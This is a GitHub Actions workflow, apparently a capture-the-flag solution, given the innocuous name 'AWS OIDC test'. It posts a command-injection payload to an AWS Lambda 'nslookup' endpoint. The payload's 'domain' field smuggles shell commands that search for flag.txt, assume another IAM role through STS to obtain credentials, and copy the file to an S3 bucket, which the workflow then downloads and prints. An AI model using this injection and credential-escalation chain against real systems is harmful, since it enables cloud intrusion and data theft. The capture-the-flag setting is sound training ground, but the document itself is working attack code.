name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Invoke Vulnerable Lambda & Exfiltrate via Function Metadata
        run: |
          API_ID="3q931syi7b"
          REGION="us-east-1"
          URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
          
          # 1. Search for flag location and write to /tmp
          # 2. Try using STS to assume CTFExecutionRole if needed
          PAYLOAD='{"domain": "127.0.0.1; FLAG_PATH=$(find / -name flag.txt 2>/dev/null); aws sts assume-role --role-arn arn:aws:iam::009661764077:role/CTFExecutionRole --role-session-name test > /tmp/creds.json; export AWS_ACCESS_KEY_ID=$(jq -r .Credentials.AccessKeyId /tmp/creds.json); export AWS_SECRET_ACCESS_KEY=$(jq -r .Credentials.SecretAccessKey /tmp/creds.json); export AWS_SESSION_TOKEN=$(jq -r .Credentials.SessionToken /tmp/creds.json); aws s3 cp $FLAG_PATH s3://platform-bucket-009661764077-us-east-1/flag.txt --region us-east-1"}'
          
          curl -s -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "$PAYLOAD"
          
          sleep 4
          
          aws s3 cp "s3://platform-bucket-009661764077-us-east-1/flag.txt" ./the_flag.txt || echo "S3 Copy failed"
          cat ./the_flag.txt
